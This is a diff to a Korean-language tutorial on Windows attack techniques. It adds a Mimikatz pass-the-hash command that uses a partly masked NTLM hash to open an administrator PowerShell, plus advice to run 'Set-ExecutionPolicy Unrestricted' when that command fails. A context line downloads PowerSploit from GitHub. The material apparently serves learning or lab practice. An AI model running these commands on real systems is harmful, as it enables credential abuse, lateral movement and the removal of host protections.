@@ -63,13 +63,28 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSp
 
 위에서 다운로드 받게되면 아래 파일이 생깁니다.
 
-사진
+<img width="615" height="44" alt="image" src="https://github.com/user-attachments/assets/1981f31d-f797-413d-90c2-891f11bbc197" />
+
 
 이후 Pass-The-Hash 기능으로 NTLM hash 값을 이용하여 관리자 계정으로 접근하는 명령어를 실행합니다.
 
 ```
 
 invoke-mimikatz -command '"sekurlsa::pth /user:user/domain:DESKTOP-B6EDDU2 /ntlm:c5928614e7dcd1e3ec18503cb1***** /run:powershell.exe"'
+
+```
+* 주의사항
+기본적으로 위 명령어는 바로 실행되지 않더라구요.
+
+<img width="841" height="105" alt="image" src="https://github.com/user-attachments/assets/7790099f-4fe8-4dda-9140-45f74f68f317" />
+
+위 명령어를 바로 실행할 경우 위 사진과 같은 오류메시지가 발생하고 이를 해결하는 방법으로는 
+
+모든 제약을 푸는 아래 명령어를 입력한 후 시도해주시면 됩니다.
+
+```
+
+Set-ExecutionPolicy Unrestricted
 
 ```
 
